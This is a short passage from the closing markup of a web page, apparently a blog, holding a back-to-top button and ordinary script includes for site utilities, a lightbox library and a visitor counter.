class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
